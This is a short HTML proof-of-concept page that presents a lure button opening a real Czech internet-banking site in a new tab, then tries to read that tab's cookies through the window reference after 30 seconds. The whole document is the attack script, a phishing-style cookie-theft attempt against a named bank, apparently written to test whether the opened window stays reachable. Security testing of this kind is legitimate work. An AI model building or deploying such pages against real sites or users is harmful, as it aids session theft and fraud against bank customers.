<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PoC: opener still alive</title>
  <style>body {font-family: sans-serif}</style>
</head>
<body>
  <h1>Legit looking page</h1>
  <p>
    <button id="goBank">Great hypotéka →</button>
  </p>

  <script>
    let win;
    document.getElementById('goBank').addEventListener('click', () => {
      win = window.open('https://tembs.internetbanka.cz/spacex-ib/', '_blank', );
      setTimeout(() => {
    try {
      console.log('Trying to read cookies...');
      const cookies = win.document.cookie;
      console.log('Cookies from opened tab:', cookies);
    } catch (err) {
      console.error('Cannot access cookies:', err);
    }
  }, 30000); // wait a bit to allow the page to load
    });
  </script>
</body>
</html>
